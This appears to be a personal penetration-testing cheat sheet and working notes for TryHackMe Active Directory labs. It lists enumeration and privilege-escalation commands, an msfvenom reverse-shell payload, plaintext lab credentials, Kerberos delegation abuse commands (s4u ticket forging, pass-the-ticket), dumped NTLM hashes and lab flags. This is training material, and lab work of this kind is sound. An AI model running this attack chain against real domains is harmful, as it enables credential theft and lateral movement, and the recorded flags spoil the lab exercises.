# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)

## Automatic web enum
- dirb | dirsearch
- linpeas
- wpsscan -U user -P password

## Basic network
- nmap (all ports)
  - script: locate -r nse$ | grep NAME
- nmap Scrips
  - locate -r nse$ | grep mysql = nmap script

## Linux
- sudo -l
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -perm -04000 -ls 2>/dev/null 
- psexec.py
- lscpu
- lsblk -a
- lsusb -v
- lspci -t -v
- fidlist -l
  
- Shell stabilize
  -  python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - export TERM=xterm

## Payloads
- msfvenom - reverse -f aspx -o app.aspx

## Windows
- /priv
- systeminfo
- smb read/write
- browser cache
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%


# Exploring AD
resolv.conf
search za.tryhackme.loc
nameserver 10.200.77.101
nameserver 10.0.0.1
options timeout:1
options attempts:2
sudo systemctl restart networking.service
dig thmdc.za.tryhackme.loc
nslookup google.com

**SSH**: ssh za.tryhackme.loc\\paula.bailey@thmwrk1.za.tryhackme.loc
Y2VgRWWiQ

t2_ross.bird
$Password = ConvertTo-SecureString "Tryhackme!" -AsPlainText -Force 
Set-ADAccountPassword -Identity "t2_ross.bird" -Reset -NewPassword $Password 

2222222
ssh za.tryhackme.loc\\t2_ross.bird@thmwrk1.za.tryhackme.loc
Tryhackme!
1.GenericWrite
2.THM{Permission.Delegation.FTW!} 
3333333
Unconstrained Delegation
Resource-Based Constrained Delegation
RBCD
Constrained Delegation
THM{Constrained.Delegation.Can.Be.Very.Bad} 
44444

THM{Printing.Some.Shellz}
666666
THM{Exploiting.GPOs.For.Fun.And.Profit}

30
SMB Signing
THM{Printing.Some.Shellz}
10.200.77.202 



cur/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb
%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db
old/text: 0FFIKa"c[#L6T>=.s*ZW'Gz04FL&7,"VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb
%),mlWLo?6$kqP
    NTLM:4207d1b7e4b942da2371174b772fdf5e
    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db  
Secret:DefaultPassword                     
old/text: vagrant  

svcIIS@za.tryhackme.loc 
Password1@

tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc 
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:WSMAN/THMSERVER1.za.tryhackme.loc

kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_WSMAN~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
